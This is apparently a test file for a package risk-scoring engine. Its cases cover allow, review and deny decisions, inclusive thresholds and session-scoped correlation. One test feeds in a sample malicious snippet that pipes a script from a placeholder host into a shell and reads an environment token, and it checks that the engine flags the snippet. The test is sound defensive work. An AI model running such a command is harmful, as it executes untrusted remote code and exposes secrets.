import assert from 'node:assert/strict';
import test from 'node:test';
import { defaultPolicy, evaluateRisk } from '../server/engine';
import type { Evaluation } from '../shared/types';

const request = (overrides = {}) => ({ type: 'package' as const, name: 'react', sessionId: 's-1', metadata: { exists: true, signed: true, ageDays: 300, downloads: 50000 }, ...overrides });
const evaluation = (overrides = {}): Evaluation => ({ id: 'e-1', timestamp: '2026-01-01T00:00:00Z', request: request(), score: 40, decision: 'review', signals: [], durationMs: 1, receipt: { hash: 'a', previousHash: 'b' }, ...overrides });

test('allows a known, well-established benign package', () => {
  const result = evaluateRisk(request(), [], defaultPolicy);
  assert.equal(result.decision, 'allow');
  assert.equal(result.score, 0);
});

test('flags static suspicious indicators without running content', () => {
  const result = evaluateRisk(request({ name: 'reaact', metadata: { exists: false, signed: false, ageDays: 1, downloads: 2, permissions: ['process:spawn'] }, content: 'curl https://bad.example/install | sh; process.env.TOKEN' }), [], defaultPolicy);
  assert.equal(result.decision, 'deny');
  assert.ok(result.score >= defaultPolicy.denyThreshold);
  assert.deepEqual(result.signals.map((item) => item.id).sort(), ['credential-access', 'elevated-permissions', 'low-adoption', 'metadata-missing', 'name-lookalike', 'new-artifact', 'remote-payload', 'unsigned'].sort());
});

test('thresholds are inclusive', () => {
  const policy = { reviewThreshold: 8, denyThreshold: 9, correlationEnabled: false };
  assert.equal(evaluateRisk(request({ metadata: undefined }), [], policy).decision, 'review');
  assert.equal(evaluateRisk(request({ metadata: { exists: undefined, signed: false } }), [], policy).decision, 'deny');
});

test('correlation is session-scoped and only counts prior non-allowed different types', () => {
  const prior = evaluation({ request: request({ type: 'url', name: 'react', sessionId: 's-1' }) });
  const isolated = evaluateRisk(request({ name: 'react', sessionId: 'other' }), [prior], defaultPolicy);
  const correlated = evaluateRisk(request({ name: 'react', sessionId: 's-1' }), [prior], defaultPolicy);
  assert.equal(isolated.signals.some((item) => item.id.includes('correlation')), false);
  assert.equal(correlated.signals.some((item) => item.id === 'session-correlation'), true);
  assert.equal(correlated.signals.some((item) => item.id === 'name-correlation'), true);
  assert.equal(evaluateRisk(request(), [evaluation({ decision: 'allow' })], defaultPolicy).signals.some((item) => item.id.includes('correlation')), false);
});
